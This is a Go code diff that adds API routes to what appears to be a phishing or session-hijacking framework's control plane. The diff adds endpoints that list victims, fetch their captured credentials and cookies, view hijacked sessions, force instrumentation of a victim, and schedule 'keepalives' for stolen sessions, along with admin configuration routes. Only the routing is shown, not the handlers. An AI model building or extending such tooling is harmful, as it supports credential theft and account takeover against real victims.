@@ -34,6 +34,14 @@ func (s *Server) Router() http.Handler {
 			r.Use(RequireAuth())
 			r.Post("/auth/logout", s.handleLogout)
 			r.Get("/me", s.handleMe)
+
+			r.Get("/victims", s.handleListVictims)
+			r.Get("/victims/{id}", s.handleGetVictim)
+			r.Get("/victims/{id}/credentials", s.handleVictimCredentials)
+			r.Get("/victims/{id}/cookies", s.handleVictimCookies)
+			r.Get("/sessions/hijacked", s.handleHijacked)
+			r.Get("/sessions/instrumented", s.handleInstrumented)
+			r.Get("/keepalives", s.handleListKeepalives)
 		})
 
 		r.Group(func(r chi.Router) {
@@ -43,6 +51,18 @@ func (s *Server) Router() http.Handler {
 			r.Delete("/users/{name}", s.handleDeleteUser)
 			r.Get("/settings", s.handleGetSettings)
 			r.Put("/settings", s.handlePutSettings)
+			r.Get("/config", s.handleGetConfig)
+			r.Patch("/config", s.handlePatchConfig)
+			r.Post("/config/reload", s.handleReloadConfig)
+			r.Post("/config/import", s.handleImportConfig)
+			r.Get("/config/restart-fields", s.handleRestartFields)
+
+			r.Delete("/victims/{id}", s.handleDeleteVictim)
+			r.Post("/victims/{id}/instrument", s.handleForceInstrument)
+
+			r.Post("/keepalives", s.handleCreateKeepalive)
+			r.Delete("/keepalives/{id}", s.handleDeleteKeepalive)
+			r.Post("/victims/{id}/keepalive", s.handleKeepaliveNow)
 		})
 	})
 	return r
@@ -50,7 +70,7 @@ func (s *Server) Router() http.Handler {
 
 // Run starts the API server. No-op when the API is disabled.
 func Run(sess *session.Session) {
-	if !sess.Config.Api.Enable {
+	if !sess.Config().Api.Enable {
 		log.Debug("API control plane disabled")
 		return
 	}
@@ -59,7 +79,7 @@ func Run(sess *session.Session) {
 		return
 	}
 	srv := New(sess)
-	addr := fmt.Sprintf("%s:%d", sess.Config.Api.Bind, sess.Config.Api.Port)
+	addr := fmt.Sprintf("%s:%d", sess.Config().Api.Bind, sess.Config().Api.Port)
 	log.Info("API control plane listening on %s", addr)
 	if err := http.ListenAndServe(addr, srv.Router()); err != nil {
 		log.Error("API server error: %s", err)
